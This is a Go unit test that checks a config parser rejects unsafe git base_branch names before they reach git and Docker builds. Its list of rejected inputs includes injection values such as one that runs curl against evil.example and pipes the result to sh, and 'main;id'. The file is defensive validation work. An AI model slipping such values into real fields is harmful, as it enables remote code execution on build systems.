package config

import (
	"strings"
	"testing"
)

// TestBaseBranchProblems: git.base_branch reaches git, Docker build
// arguments and (in M4) Cloud Build, so it must be a plain branch name. Git
// itself accepts x$(…) and other shell metacharacters in a ref name.
func TestBaseBranchProblems(t *testing.T) {
	withBranch := func(b string) string {
		return strings.Replace(minimalYAML, "  provider: github\n", "  provider: github\n  base_branch: '"+b+"'\n", 1)
	}
	for _, bad := range []string{
		"x$(curl${IFS}-s${IFS}evil.example|sh)", "main;id", "a b", "-main", "feat..x", "feat//x",
		"feat/", "feat.", "feat.lock", "feat/.x", ".hidden", "a\"b", "a`b",
	} {
		t.Run(bad, func(t *testing.T) {
			if _, problems := Parse([]byte(withBranch(bad))); !hasProblem(problems, "git.base_branch", "branch name", 0) {
				t.Fatalf("base_branch %q: want a git.base_branch problem, got %v", bad, problems)
			}
		})
	}
	for _, good := range []string{"main", "develop", "release/1.2", "feature/JIRA-123_x.y", "_x"} {
		t.Run(good, func(t *testing.T) {
			if cfg, problems := Parse([]byte(withBranch(good))); cfg == nil {
				t.Fatalf("base_branch %q: unexpected problems %v", good, problems)
			}
		})
	}
}
